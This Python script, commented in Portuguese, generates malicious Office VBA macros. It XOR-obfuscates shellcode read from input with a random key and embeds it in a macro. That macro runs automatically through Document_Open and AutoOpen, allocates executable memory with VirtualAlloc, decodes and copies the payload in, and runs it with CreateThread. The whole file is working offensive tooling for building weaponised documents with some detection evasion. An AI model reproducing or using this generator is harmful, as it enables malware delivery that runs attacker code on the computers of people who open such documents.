import sys
import re
import random

# Cores para o terminal
GREEN = "\033[92m"
BLUE = "\033[94m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
END = "\033[0m"

def generate_vba_complete():
    input_data = sys.stdin.read()
    byte_matches = re.findall(r'(\d+)', input_data)

    if not byte_matches:
        print(f"{YELLOW}[!] Erro: Nenhum byte encontrado.{END}")
        return

    bytes_list = [int(b) for b in byte_matches]
    key = random.randint(1, 255)
    xored_bytes = [b ^ key for b in bytes_list]

    vba_array_lines = []
    qtd_caracteres = 30
    for i in range(0, len(xored_bytes), qtd_caracteres):
        chunk = xored_bytes[i:i+qtd_caracteres]
        line = ", ".join(map(str, chunk))
        if i + qtd_caracteres < len(xored_bytes):
            vba_array_lines.append(f"        {line}, _")
        else:
            vba_array_lines.append(f"        {line}")

    formatted_array = "\n".join(vba_array_lines)

    vba_code = f"""
' --- SEÇÃO DE COMPILAÇÃO CONDICIONAL PARA 32/64 BITS ---
#If VBA7 Then
    ' Office 2010 ou superior (64-bit e 32-bit com suporte a PtrSafe)
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
    Dim addr As LongPtr
#Else
    ' Versões antigas ou ambiente estritamente 32-bit
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As Long, ByRef sSource As Any, ByVal lLength As Long) As Long
    Private Declare Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As Long, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef ThreadId As Long) As Long
    Dim addr As Long
#End If

Public Enum ALLOC_TYPES
    MEM_COMMIT = &H1000
    MEM_RESERVE = &H2000
End Enum

Sub Document_Open()
    Main
End Sub

Sub AutoOpen()
    Main
End Sub

Sub Main()
    Dim buf As Variant
    Dim data As Long
    Dim key As Byte
    Dim i As Long

    ' Chave XOR: {key}
    key = &H{key:02X}

    buf = Array({formatted_array.strip()})

    ' Alocação Dinâmica baseada na arquitetura detectada
    addr = VirtualAlloc(0, UBound(buf) + 1, ALLOC_TYPES.MEM_COMMIT Or ALLOC_TYPES.MEM_RESERVE, &H40)

    For i = LBound(buf) To UBound(buf)
        data = buf(i) Xor key
        RtlMoveMemory addr + i, data, 1
    Next i

    CreateThread 0, 0, addr, 0, 0, 0
End Sub
"""

    print(f"\n{CYAN}{BOLD}{'='*70}{END}")
    print(f"{GREEN}{BOLD}   GERADOR VBA MULTI-ARQUITETURA (x86/x64){END}")
    print(f"{CYAN}{BOLD}{'='*70}{END}")
    print(vba_code)
    print(f"{CYAN}{BOLD}{'='*70}{END}\n")

if __name__ == "__main__":
    generate_vba_complete()
